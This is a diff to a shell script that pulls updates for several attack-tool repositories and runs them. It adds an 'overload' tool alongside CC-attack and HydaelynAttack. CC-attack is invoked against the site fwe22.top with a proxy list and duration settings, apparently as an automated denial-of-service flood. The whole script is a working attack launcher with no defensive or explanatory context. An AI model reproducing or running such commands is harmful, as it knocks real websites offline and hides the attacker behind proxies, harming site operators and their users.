@@ -18,9 +18,19 @@ git pull
 cd ..
 
 echo ""
+echo "updata overload"
+cd overload
+git pull
+cd ..
+
+echo ""
 echo "CC-attack"
 python3 CC-attack/cc.py -url http://fwe22.top/ -f proxy.txt -v 5 -s 30
 
 echo ""
 echo "HydaelynAttack"
 python3 HydaelynAttack/HydaelynAttack_p_once_noLog.py
+
+echo ""
+echo "overload"
+python3 overload/overload_p.py
